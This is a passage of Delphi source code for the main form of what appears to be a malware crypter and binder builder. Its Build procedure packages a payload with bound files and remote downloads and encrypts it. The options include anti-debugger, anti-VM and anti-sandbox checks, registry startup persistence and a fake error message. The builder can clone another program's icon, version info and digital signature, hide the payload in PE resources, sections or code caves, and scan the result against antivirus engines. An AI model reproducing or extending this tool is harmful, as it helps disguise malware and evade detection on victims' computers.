    messagetest.Enabled := true;
  end else
  begin
    messagetype.Enabled := false;
    messagetype.ItemIndex := 0;
    messagecaption.Enabled := false;
    messagecaption.Text := '';
    messagetext.Enabled := false;
    messagetext.Text := '';
    messageicon.Enabled := false;
    messageicon.ItemIndex := -1;
    messagebutton.Enabled := false;
    messagebutton.ItemIndex := -1;
    messagetest.Enabled := false;
  end;
end;

procedure TFrm_Main.MenuItem1Click(Sender: TObject);
begin
  Frm_Downloader := TFrm_Downloader.Create(Application);
  Frm_Downloader.Caption := 'Downloader Add';
  Frm_Downloader.Left := Frm_Main.Left + 250;
  Frm_Downloader.Top := Frm_Main.top + 50;
  Frm_Downloader.ShowModal;
  Frm_Downloader.Free;
end;

procedure TFrm_Main.MenuItem2Click(Sender: TObject);
var
List :Tlistitem;
Data :PBinder;
begin
  if (List_Downloader.Selected <> nil) then
  begin
    List := List_Downloader.Selected;
    Data := List.Data;
    Frm_Downloader := TFrm_Downloader.Create(Application);
    Frm_Downloader.Caption := 'Downloader Edit '+Inttostr(List.Index);
    Frm_Downloader.FDW_EditFile.Text := List.Caption;
    Frm_Downloader.FDW_EditlDelay.Value := Data^.Delay;
    Frm_Downloader.FDW_ComboExec.ItemIndex := Data^.Exec;
    Frm_Downloader.FDW_ComboExecChange(Sender);
    Frm_Downloader.FDW_C_ExecPath.ItemIndex := Data^.Path;
    Frm_Downloader.FDW_C_ExecPathChange(Sender);
    Frm_Downloader.FDW_C_ExecName.Text := String(Data^.Name);
    Frm_Downloader.FDW_EditParam.Text := String(Data^.Parameter);
    Frm_Downloader.Left := Frm_Main.Left + 250;
    Frm_Downloader.Top := Frm_Main.top + 50;
    Frm_Downloader.ShowModal;
    Frm_Downloader.Free;
  end;
end;

procedure TFrm_Main.MenuItem4Click(Sender: TObject);
begin
  if (List_Downloader.Selected <> nil) then
  begin
    dispose(PBinder(List_Downloader.Selected.Data));
    List_Downloader.DeleteSelected;
  end;
end;

procedure TFrm_Main.MenuItem5Click(Sender: TObject);
var
i : integer;
begin
  for i := List_Downloader.Items.Count -1 downto 0 do
  begin
    if assigned(List_Downloader.Items.Item[i].Data) then
      dispose(PBinder(List_Downloader.Items.Item[i].Data));
    List_Downloader.Items.Delete(i);
  end;
end;

procedure TFrm_Main.messagebuttonChange(Sender: TObject);
begin
  if messagebutton.ItemIndex = 0 then iButton := MB_OK
  else if messagebutton.ItemIndex = 1 then iButton := MB_OKCANCEL
  else if messagebutton.ItemIndex = 2 then iButton := MB_ABORTRETRYIGNORE
  else if messagebutton.ItemIndex = 3 then iButton := MB_YESNOCANCEL
  else if messagebutton.ItemIndex = 4 then iButton := MB_YESNO
  else if messagebutton.ItemIndex = 5 then iButton := MB_RETRYCANCEL;
end;

procedure TFrm_Main.messageiconChange(Sender: TObject);
begin
  if messageicon.ItemIndex = 0 then iIcon := MB_ICONWARNING
  else if messageicon.ItemIndex = 1 then iIcon := MB_ICONERROR
  else if messageicon.ItemIndex = 2 then iIcon := MB_ICONINFORMATION
  else if messageicon.ItemIndex = 3 then iIcon := MB_ICONSTOP
end;

procedure TFrm_Main.messagetestClick(Sender: TObject);
begin
  Messagebox(0,PChar(messagetext.Text),Pchar(messagecaption.Text),IButton+iIcon);
end;

procedure TFrm_Main.Select1Click(Sender: TObject);
begin
  Selecticonlist(list_icon.Selected);
end;

function TFrm_Main.ProcessData(Data:ansistring):ansistring;
begin
  //>NtCompress Data
  if edit_cryptcomp.ItemIndex = 1 then
  begin
    UpdateStatus('---------------> Ntdll Compress Storage ',3);
    Data := NtCompress(Data);
  end else

  //>Zlib Data
  if edit_cryptcomp.ItemIndex = 2 then
  begin
    UpdateStatus('---------------> Zlib Compress Storage ',3);
    Data := ZCompressStr(Data);
  end else
  begin
    UpdateStatus('---------------> Not Compress ',3);
  end;

  //>SimpleXor Data
  if edit_cryptenc.ItemIndex = 0 then
  begin
    UpdateStatus('---------------> [Xor] Encrypt Storage ',5);
    Data := SimpleXor(Data,KeyEnc);
  end else

  //>Rc4 Data
  if edit_cryptenc.ItemIndex = 1 then
  begin
    UpdateStatus('---------------> [RC4] Encrypt Storage ',5);
    Data := RC4(Data,KeyEnc);
  end else

  //>Blowfish Normal Data
  if edit_cryptenc.ItemIndex = 2 then
  begin
    UpdateStatus('---------------> [Normal-Blowfish] Encrypt Storage ',5);
    Data := BFEncrypt(KeyEnc,pansichar(Data),length(Data));
  end else

  //>Blowfish CBC Data
  if edit_cryptenc.ItemIndex = 3 then
  begin
    UpdateStatus('---------------> [CBC-Blowfish] Encrypt Storage ',5);
    Data := BFEncryptCBC(KeyEnc,pansichar(Data),length(Data));
  end else

  //>DES Normal Data
  if edit_cryptenc.ItemIndex = 4 then
  begin
    UpdateStatus('---------------> [Normal-DES] Encrypt Storage ',5);
    Data := DESEncrypt(Key128to64(KeyEnc),pansichar(Data),length(Data));
  end else

  //>DES CBC Data
  if edit_cryptenc.ItemIndex = 5 then
  begin
    UpdateStatus('---------------> [CBC-DES] Encrypt Storage ',5);
    Data := DESEncryptCBC(Key128to64(KeyEnc),pansichar(Data),length(Data));
  end else

  //>3DES Normal Data
  if edit_cryptenc.ItemIndex = 6 then
  begin
    UpdateStatus('---------------> [Normal-3DES] Encrypt Storage ',5);
    Data := TripleDESEncrypt(KeyEnc,pansichar(Data),length(Data));
  end else

  //>3DES CBC Data
  if edit_cryptenc.ItemIndex = 7 then
  begin
    UpdateStatus('---------------> [CBC-3DES] Encrypt Storage ',5);
    Data := TripleDESEncryptCBC(KeyEnc,pansichar(Data),length(Data));
  end else

  //>Rijndael Normal Data
  if edit_cryptenc.ItemIndex = 8 then
  begin
    UpdateStatus('---------------> [Normal-Rijndael] Encrypt Storage ',5);
    Data := RDLEncrypt(KeyEnc,length(KeyEnc),pansichar(Data),length(Data));
  end else

  //>Rijndael CBC Data
  if edit_cryptenc.ItemIndex = 9 then
  begin
    UpdateStatus('---------------> [CBC-Rijndael] Encrypt Storage ',5);
    Data := RDLEncryptCBC(KeyEnc,length(KeyEnc),pansichar(Data),length(Data));
  end;

  result := data;
end;

Procedure TFrm_Main.Build(const projectname,dirpath:string);
var
GeneratedResult : string;
BuildInfo : TBuildInfo;
code : tstringlist;
Buff,cryptdata : ansistring;
Streaming :TMemoryStream;
I : integer;
Attrib :Cardinal;
TempName,buildresult : string;
NextData : PBinder;
havebrowser,havedrop,usepath :boolean;
havebinder,havedownloader : boolean;
stubindex : integer;
begin
  {$I SE_PROTECT_START_ULTRA.inc}
  NameList := TGpStringHash.Create(3000,true);
  ListBox_BuildLog.Items.Clear;
  ProgressBuild.Value := 0;
  code := tstringlist.Create;
  Streaming := TMemoryStream.Create;
  havebrowser := false;
  havedrop := false;
  havebinder := false;
  havedownloader := false;
  GeneratedResult := '';
  stubindex := Edit_filetostub.ItemIndex;
  try
    {start here}
    UpdateStatus('Start Build',0);

    //>Save Crypt Info
    UpdateStatus('---------------> Start Processing Crypter ',1);
    WriteUniString(Streaming,edit_cryptparam.Text); //parameter
    WriteByte(Streaming,edit_cryptrun.ItemIndex); //run method
    usepath := (edit_cryptrun.ItemIndex = 1) or (edit_cryptrun.ItemIndex = 2);
    if (edit_cryptrun.ItemIndex = 1) then
    begin
      havebrowser := true;
      WriteByte(Streaming,Settings.Execute.index); //index
      WriteUniString(Streaming,Settings.Execute.Filename); //Filename
    end else
    if (edit_cryptrun.ItemIndex = 2) then
    begin
      havedrop := true;
      WriteByte(Streaming,Settings.Drop.index); //index
      WriteUniString(Streaming,Settings.Drop.Filename); //Filename
      WriteBoolean(Streaming,Settings.Drop.Hidden); //hidden
      WriteBoolean(Streaming,Settings.Drop.system); //system
    end;

    //>Load Crypt File
    UpdateStatus('---------------> Load Crypt File ',3);
    Buff := LoadFile2String(edit_cryptfile.Text);

    //>Store Crypt Buff
    UpdateStatus('---------------> Store Crypt Buff ',3);
    WriteAnsiString(Streaming,Buff); // buff

    //>Processing Binder
    UpdateStatus('---------------> Start Processing Binder ',1);
    if (List_Binder.Items.Count <> 0) then
    begin
      havebinder := true;
      WriteInteger(Streaming,List_Binder.Items.Count); //Binder Count
      for i := 0 to List_Binder.Items.Count - 1 do
      begin
        NextData := List_Binder.Items.Item[i].Data;
        {$IFDEF DebugMode}codesite.SendAssigned('BinderData '+inttostr(i),NextData);{$ENDIF}
        WriteUniString(Streaming,NextData^.Parameter); //parameter
        WriteInteger(Streaming,NextData^.Delay); //Delay
        if not usepath then usepath := (NextData^.Exec =2) or (NextData^.Exec =1);
        if not havebrowser then havebrowser := (NextData^.Exec =2);
        if not havedrop then havedrop := (NextData^.Exec =1);
        WriteByte(Streaming,NextData^.Exec); //Exec
        WriteByte(Streaming,NextData^.Path); //Path
        WriteUniString(Streaming,NextData^.Name); //Filename
        Buff := LoadFile2String(List_Binder.Items.Item[i].Caption);
        WriteAnsiString(Streaming,Buff); // buff
      end;
    end;
    UpdateStatus('---------------> End Processing Binder ',20);

    //>Processing Downloader
    UpdateStatus('---------------> Start Processing Downloader ',1);
    if (List_Downloader.Items.Count <> 0) then
    begin
      havedownloader := true;
      WriteInteger(Streaming,List_Downloader.Items.Count); //Binder Count
      for i := 0 to List_Downloader.Items.Count - 1 do
      begin
        NextData := List_Downloader.Items.Item[i].Data;
        WriteUniString(Streaming,NextData^.Parameter); //parameter
        WriteInteger(Streaming,NextData^.Delay); //Delay
        if not usepath then usepath := (NextData^.Exec =2) or (NextData^.Exec =1);
        if not havebrowser then havebrowser := (NextData^.Exec =2);
        if not havedrop then havedrop := (NextData^.Exec =1);
        WriteByte(Streaming,NextData^.Exec); //Exec
        WriteByte(Streaming,NextData^.Path); //Path
        WriteUniString(Streaming,NextData^.Name); //Filename
        WriteUniString(Streaming,List_Downloader.Items.Item[i].Caption); //LinkPath
      end;
    end;
    UpdateStatus('---------------> End Processing Downloader ',10);

    //>Fill BuildInfo
    UpdateStatus('---------------> Fill BuildInfo ',3);
    BuildInfo.projectname := ansistring(genkey);
    {$IFDEF DebugMode}BuildInfo.Debug := false;  {$ENDIF}
    BuildInfo.hardwareid := GetHardwareid;
    BuildInfo.CompressMethod := edit_cryptcomp.ItemIndex;
    BuildInfo.EncryptionMethod := edit_cryptenc.ItemIndex;
    BuildInfo.AntiDebug := Check_AntiDebug.Checked;
    BuildInfo.AntiMonitor := Check_AntiMonitor.Checked;
    BuildInfo.AntiSandbox := Check_AntiSandbox.Checked;
    BuildInfo.AntiVM := Check_AntiVM.Checked;
    BuildInfo.AntiEmul := Check_AntiEmulator.Checked;
    BuildInfo.PatchPeb := check_pacthPeb.Checked;
    BuildInfo.usepath := usepath;
    BuildInfo.havebrowser := havebrowser;
    BuildInfo.havedrop := havedrop;
    BuildInfo.havebinder := havebinder;
    BuildInfo.havedownloader := havedownloader;
    BuildInfo.haveStartup := Check_HKLM.Checked or Check_HKCU.Checked or Check_Policies.Checked or Check_Activex.Checked;
    BuildInfo.hklm := Check_HKLM.Checked;
    if BuildInfo.hklm then
    begin
      TempName := Edit_HKLM.Text;
      if (TempName = '') then TempName := genkey;
      BuildInfo.hklmkey := ansistring(TempName);
    end;
    BuildInfo.hkcu := Check_hkcu.Checked;
    if BuildInfo.hkcu then
    begin
      TempName := Edit_hkcu.Text;
      if (TempName = '') then TempName := genkey;
      BuildInfo.hkcukey := ansistring(TempName);
    end;
    BuildInfo.Policies := Check_Policies.Checked;
    if BuildInfo.Policies then
    begin
      TempName := Edit_Policies.Text;
      if (TempName = '') then TempName := genkey;
      BuildInfo.Policieskey := ansistring(TempName);
    end;
    BuildInfo.Activex := Check_Activex.Checked;
    if BuildInfo.Activex then
    begin
      TempName := Edit_Activex.Text;
      if (TempName = '') then TempName := GenID;
      BuildInfo.Activexkey := ansistring(TempName);
      BuildInfo.ComponentID := ansistring(projectname);
      BuildInfo.Vesion := '0.0.3.4';
    end;
    BuildInfo.Cryptdata := '';
    GenerateMD5Key(KeyEnc,genkey);
    UpdateStatus('---------------> Storage Encryption Key : '+BufferToHex(KeyEnc,length(KeyEnc)),3);
    BuildInfo.EncKey := ansistring(BufferToVariable(KeyEnc,length(KeyEnc),string(GetName('EncKey'))));

    BuildInfo.ActiveFakeM := frm_main.Group_message.Checked;
    if BuildInfo.ActiveFakeM then
    begin
      BuildInfo.MessageType := frm_main.messagetype.ItemIndex;
      TempName := frm_main.messagetext.Text;
      if (TempName = '') then TempName := ' ';
      BuildInfo.MessageText := ansistring(TempName);
      TempName := frm_main.messagecaption.Text;
      if (TempName = '') then TempName := ' ';
      BuildInfo.MessageCaption := ansistring(TempName);
      BuildInfo.MessageButton := Ansistring(inttostr(iIcon+iButton));
    end;

    //>ProcessData Storage
    Streaming.Position := 0;
    setlength(cryptdata,Streaming.Size);
    Streaming.Read(Pointer(cryptdata)^,Streaming.Size);
    cryptdata := ProcessData(cryptdata);
    UpdateStatus('---------------> Storage Size = '+inttostr(length(cryptdata)),3);

    if (Edit_filetostub.ItemIndex = 0) then
    begin
      stubindex := 1;
      settings.Resource.RName := 'CGPROT';
      settings.Resource.RType := 10;
      settings.Resource.RSplit := 20;
    end;

    if (length(cryptdata) < 1500000) and (Edit_filetostub.ItemIndex = 0) then
    begin
      UpdateStatus('---------------> Storage Store To Code ',10);
      BuildInfo.BufferMethod := 0;
      BuildInfo.Cryptdata := ThreadBufferToVariable(cryptdata,string(GetName('Data')));
    end else
    begin
      if (stubindex = 1) then
      begin
        BuildInfo.BufferMethod := 1;
        TempName := settings.Resource.RName;
        if (TempName = '') then TempName := 'CGPROT';
        BuildInfo.ResourceName := ansistring(TempName);
        BuildInfo.Restype := ansistring(inttostr(settings.Resource.RType));
        BuildInfo.ResSplit := ansistring(inttostr(settings.Resource.RSplit));
      end else
        BuildInfo.BufferMethod := 2;
    end;

    //>>Generate Code
    UpdateStatus('---------------> Generate Code',3);
    code.Add(string(TMaincode(Engine)(BuildInfo)));

    //{$IFDEF DebugMode}
    //code.SaveToFile('debug\tempcode.dpr');
    //{$ENDIF}

    //>>Compile Our Code
    UpdateStatus('---------------> Compile Code',3);
    if Compile(String(BuildInfo.projectname),code,buildresult) then
    begin
      {$IFDEF DebugMode}
      codesite.Send(csmnote,'succes compile',fileexists(String(BuildInfo.projectname)+'.exe'));
      {$ENDIF}
      copyfile(pchar(String(BuildInfo.projectname)+'.exe'),pchar(dirpath+projectname+'.exe'),false);
      deletefile(String(BuildInfo.projectname)+'.exe');
    end;

    stringtofile(buildresult,'buildlog.txt');

    //>>Process Storage if not writen in code
    if (BuildInfo.Cryptdata = '') then
    begin
      if not fileexists(dirpath+projectname+'.exe') then
      begin
        showmessage('Final File Not Exists, Failed Compiling...!!!');
        exit;
      end;
      //use resource
      if (stubindex = 1) then
      begin
        UpdateStatus('---------------> Storage Store To Resource ',10);
        TempName := settings.Resource.RName;
        if (TempName = '') then TempName := 'CGPROT';
        WriteToReSource(dirpath+projectname+'.exe',pchar(settings.Resource.RType),cryptdata,settings.Resource.RSplit,TempName);
      end else
      if (stubindex = 2) then
      begin
        //use Section
        UpdateStatus('---------------> Storage Store To Section ',10);
        TempName := settings.Section.SName;
        if (TempName = '') then TempName := 'CGPROT';
        Attrib := 0;
        if settings.Section.Check1 then Attrib := Attrib or IMAGE_SCN_CNT_CODE;
        if settings.Section.Check2 then Attrib := Attrib or IMAGE_SCN_MEM_WRITE;
        if settings.Section.Check3 then Attrib := Attrib or IMAGE_SCN_MEM_READ;
        if settings.Section.Check4 then Attrib := Attrib or IMAGE_SCN_MEM_EXECUTE;
        AddNewSection(dirpath+projectname+'.exe',AnsiString(TempName),Attrib,@cryptdata[1],length(cryptdata));
      end else
      if (stubindex = 3) then
      begin
        //use PushingEnvelope
        UpdateStatus('---------------> Storage Store To Cave Header (Pushing The Envelope) ',10);
        Pushingtheenvolpe(dirpath+projectname+'.exe',@cryptdata[1],length(cryptdata));
      end else
      if (stubindex = 4) then
      begin
        //use EOF
        UpdateStatus('---------------> Storage Store To EOF ',10);
        WriteEof(dirpath+projectname+'.exe',@cryptdata[1],length(cryptdata));
      end else
      if (stubindex = 5) then
      begin
        //use ExSection
        UpdateStatus('---------------> Storage Store To ExSection ',10);
        ExSection(dirpath+projectname+'.exe',@cryptdata[1],length(cryptdata));
      end;
    end;

    //>Wipe Dos Header
    if check_PE1.Checked then
    begin
      UpdateStatus('---------------> Wipe Dos Header ',2);
      WipeStub(dirpath+projectname+'.exe',projectname+'.exe');
    end;

    //>Stript Relocations
    if check_PE2.Checked then
    begin
      UpdateStatus('---------------> Stript Relocations ',2);
      StripRelocationTable(dirpath+projectname+'.exe');
    end;

    //>Clone Icon
    if Check_CloneIcon.checked then
    begin
      UpdateStatus('---------------> Clone Icon ',2);
      if fileexists(selectedicon) then
      begin
        ChangeIcon(selectedicon,dirpath+projectname+'.exe');
      end else
      begin
        ChangeIcon(Edit_CloneSource.Text,dirpath+projectname+'.exe');
      end;
    end;

    //>Clone Version
    if check_cloneversion.Checked then
    begin
      UpdateStatus('---------------> Clone Version ',2);
      cloneVersion(Edit_CloneSource.Text,dirpath+projectname+'.exe');
    end;

    //>Clone DigitalSignature
    if Check_CloneSign.Checked then
    begin
      UpdateStatus('---------------> Clone Digital-Signature ',2);
      CloneSign(Edit_CloneSource.Text,dirpath+projectname+'.exe');
    end;

    //>ReCheckSum File
    if check_PE3.Checked then
    begin
      UpdateStatus('---------------> ReCheckSum File ',2);
      ReChecksum(dirpath+projectname+'.exe');
    end;

    if Check_Eof.Checked then
    begin
      UpdateStatus('---------------> Copy EOf ',3);
      AddEof(edit_cryptfile.Text,dirpath+projectname+'.exe');
    end;

    if check_Misc1.Checked then
    begin
      UpdateStatus('---------------> Generate Result Log',10);
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'MainInfo'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'File : '+edit_cryptfile.text +#13#10;
      GeneratedResult := GeneratedResult + 'Param : '+edit_cryptparam.text+#13#10;
      GeneratedResult := GeneratedResult + 'Encryption : '+edit_cryptenc.text+#13#10;
      GeneratedResult := GeneratedResult + 'Compression : '+edit_cryptcomp.text+#13#10;
      GeneratedResult := GeneratedResult + 'RunMethod : '+edit_cryptrun.text+#13#10;
      GeneratedResult := GeneratedResult + 'BinderCount : '+inttostr(List_Binder.Items.Count)+#13#10;
      GeneratedResult := GeneratedResult + 'DownloaderCount : '+inttostr(List_Downloader.Items.Count)+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Clone'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'File Source : '+Edit_CloneSource.text +#13#10;
      GeneratedResult := GeneratedResult + 'VersionInfo : '+Booltostr(Check_CloneVersion.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Icon : '+Booltostr(Check_CloneIcon.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Digital Signature : '+Booltostr(Check_CloneSign.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Antis'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Sandbox : '+Booltostr(Check_AntiSandbox.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Virtual Machine : '+Booltostr(Check_AntiVM.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Debugger : '+Booltostr(Check_AntiDebug.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Monitor : '+Booltostr(Check_AntiMonitor.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Emulator : '+Booltostr(Check_AntiEmulator.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Storage'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Storage Size :'+inttostr(length(cryptdata))+#13#10;
      if (length(cryptdata) < 1500000) and (stubindex = 0) then
      begin
      GeneratedResult := GeneratedResult + 'Storage Location : Code'+#13#10;
      end else
      begin
        if (stubindex = 1) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : Resource -'+settings.Resource.RName+' - '+inttostr(settings.Resource.RType)+' - '+inttostr(settings.Resource.RSplit)+#13#10;
        end else
        if (stubindex = 2) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : Section -'+settings.Section.SName+#13#10;
        end else
        if (stubindex = 3) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : Pushing Envelope '#13#10;
        end else
        if (stubindex = 4) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : EOF '+#13#10;
        end else
        if (stubindex = 5) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : ExSection '+#13#10;
        end;
      end;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'PE Utils'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Wipe DosHeader : '+Booltostr(check_PE1.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Stript Relocations : '+Booltostr(check_PE2.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'ReCheckSum : '+Booltostr(check_PE3.checked,true)+#13#10;
      if not check_Misc2.Checked then
      begin
        stringtofile(GeneratedResult,projectname+'.txt');
      end;
    end;

    if check_Misc2.Checked then
    begin
      UpdateStatus('---------------> Scan Result',3);
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Scan Result'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      TempName := ScanFIle(dirpath+projectname+'.exe',40);
      GeneratedResult := GeneratedResult +  TempName;
      stringtofile(GeneratedResult,projectname+'.txt');
    end;

    if check_logbuild.Checked then
    begin
      UpdateStatus('---------------> Generate LogBuild',3);
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'SourceCode'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + code.Text;
      GenerateMD5Key(KeyEnc,inttostr(GetHardwareid));
      cryptdata := ansistring(GeneratedResult);
      cryptdata := RDLEncrypt(KeyEnc,length(KeyEnc),pansichar(cryptdata),length(cryptdata));
      exStringToFile(cryptdata,'logbuild.dat');
    end;

    UpdateStatus('End Build',100);
    {End here}

    if assigned(code) then code.Free;
    if assigned(NameList) then NameList.Free;
    if assigned(Streaming) then Streaming.Free;
  Except
    if assigned(code) then code.Free;
    if assigned(NameList) then NameList.Free;
    if assigned(Streaming) then Streaming.Free;
  end;
  {$I SE_PROTECT_END.inc}
end;
end.
